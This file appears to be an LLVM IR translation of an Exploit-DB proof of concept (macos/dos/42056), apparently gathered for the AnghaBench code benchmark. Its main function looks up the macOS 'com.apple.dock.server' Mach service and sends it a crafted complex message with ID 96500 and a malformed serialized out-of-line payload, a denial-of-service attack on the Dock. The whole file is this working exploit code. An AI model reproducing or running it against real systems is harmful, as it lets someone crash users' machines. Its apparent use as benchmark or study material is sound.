; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_42056.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_42056.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.dock_msg = type { i32, %struct.TYPE_6__, %struct.TYPE_5__, %struct.TYPE_4__, i32 }
%struct.TYPE_6__ = type { i32, i32, i32, i32, i32 }
%struct.TYPE_5__ = type { i8*, i32, i32, i64, i32 }
%struct.TYPE_4__ = type { i32 }

@bootstrap_port = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [22 x i8] c"com.apple.dock.server\00", align 1
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [30 x i8] c" [-] unable to lookup service\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [22 x i8] c"got service port: %x\0A\00", align 1
@__const.main.serialized_string = private unnamed_addr constant [7 x i8] c"d\00AA\01\02\03", align 1
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@MACH_MSG_TYPE_COPY_SEND = common dso_local global i32 0, align 4
@MACH_MSGH_BITS_COMPLEX = common dso_local global i32 0, align 4
@MACH_MSG_OOL_DESCRIPTOR = common dso_local global i32 0, align 4
@MACH_MSG_PHYSICAL_COPY = common dso_local global i32 0, align 4
@MACH_SEND_MSG = common dso_local global i32 0, align 4
@MACH_MSG_TIMEOUT_NONE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [41 x i8] c" [-] mach_msg failed with error code:%x\0A\00", align 1
@.str.4 = private unnamed_addr constant [28 x i8] c" [+] looks like that sent?\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca [7 x i8], align 1
  %5 = alloca %struct.dock_msg, align 8
  store i32 0, i32* %1, align 4
  %6 = load i32, i32* @bootstrap_port, align 4
  %7 = call i64 @bootstrap_look_up(i32 %6, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i32* %3)
  store i64 %7, i64* %2, align 8
  %8 = load i64, i64* %2, align 8
  %9 = load i64, i64* @KERN_SUCCESS, align 8
  %10 = icmp ne i64 %8, %9
  br i1 %10, label %11, label %15

11:                                               ; preds = %0
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.1, i64 0, i64 0))
  %13 = load i32, i32* @EXIT_FAILURE, align 4
  %14 = call i32 @exit(i32 %13) #4
  unreachable

15:                                               ; preds = %0
  %16 = load i32, i32* %3, align 4
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0), i32 %16)
  %18 = bitcast [7 x i8]* %4 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %18, i8* align 1 getelementptr inbounds ([7 x i8], [7 x i8]* @__const.main.serialized_string, i32 0, i32 0), i64 7, i1 false)
  %19 = bitcast %struct.dock_msg* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %19, i8 0, i64 64, i1 false)
  %20 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 1
  %21 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %20, i32 0, i32 0
  store i32 64, i32* %21, align 4
  %22 = load i32, i32* @MACH_PORT_NULL, align 4
  %23 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 1
  %24 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %23, i32 0, i32 4
  store i32 %22, i32* %24, align 4
  %25 = load i32, i32* %3, align 4
  %26 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 1
  %27 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %26, i32 0, i32 1
  store i32 %25, i32* %27, align 4
  %28 = load i32, i32* @MACH_MSG_TYPE_COPY_SEND, align 4
  %29 = call i32 @MACH_MSGH_BITS(i32 %28, i32 0)
  %30 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 1
  %31 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %30, i32 0, i32 3
  store i32 %29, i32* %31, align 4
  %32 = load i32, i32* @MACH_MSGH_BITS_COMPLEX, align 4
  %33 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 1
  %34 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %33, i32 0, i32 3
  %35 = load i32, i32* %34, align 4
  %36 = or i32 %35, %32
  store i32 %36, i32* %34, align 4
  %37 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 1
  %38 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %37, i32 0, i32 2
  store i32 96500, i32* %38, align 4
  %39 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 0
  store i32 7, i32* %39, align 8
  %40 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 3
  %41 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %40, i32 0, i32 0
  store i32 1, i32* %41, align 8
  %42 = load i32, i32* @MACH_MSG_OOL_DESCRIPTOR, align 4
  %43 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 2
  %44 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %43, i32 0, i32 4
  store i32 %42, i32* %44, align 8
  %45 = getelementptr inbounds [7 x i8], [7 x i8]* %4, i64 0, i64 0
  %46 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 2
  %47 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %46, i32 0, i32 0
  store i8* %45, i8** %47, align 8
  %48 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 2
  %49 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %48, i32 0, i32 1
  store i32 7, i32* %49, align 8
  %50 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 2
  %51 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %50, i32 0, i32 3
  store i64 0, i64* %51, align 8
  %52 = load i32, i32* @MACH_MSG_PHYSICAL_COPY, align 4
  %53 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 2
  %54 = getelementptr inbounds %struct.TYPE_5__, %struct.TYPE_5__* %53, i32 0, i32 2
  store i32 %52, i32* %54, align 4
  %55 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 1
  %56 = load i32, i32* @MACH_SEND_MSG, align 4
  %57 = getelementptr inbounds %struct.dock_msg, %struct.dock_msg* %5, i32 0, i32 1
  %58 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %57, i32 0, i32 0
  %59 = load i32, i32* %58, align 4
  %60 = load i32, i32* @MACH_PORT_NULL, align 4
  %61 = load i32, i32* @MACH_MSG_TIMEOUT_NONE, align 4
  %62 = load i32, i32* @MACH_PORT_NULL, align 4
  %63 = call i64 @mach_msg(%struct.TYPE_6__* %55, i32 %56, i32 %59, i32 0, i32 %60, i32 %61, i32 %62)
  store i64 %63, i64* %2, align 8
  %64 = load i64, i64* %2, align 8
  %65 = load i64, i64* @KERN_SUCCESS, align 8
  %66 = icmp ne i64 %64, %65
  br i1 %66, label %67, label %72

67:                                               ; preds = %15
  %68 = load i64, i64* %2, align 8
  %69 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.3, i64 0, i64 0), i64 %68)
  %70 = load i32, i32* @EXIT_FAILURE, align 4
  %71 = call i32 @exit(i32 %70) #4
  unreachable

72:                                               ; preds = %15
  %73 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.4, i64 0, i64 0))
  ret i32 0
}

declare dso_local i64 @bootstrap_look_up(i32, i8*, i32*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #3

declare dso_local i32 @MACH_MSGH_BITS(i32, i32) #1

declare dso_local i64 @mach_msg(%struct.TYPE_6__*, i32, i32, i32, i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
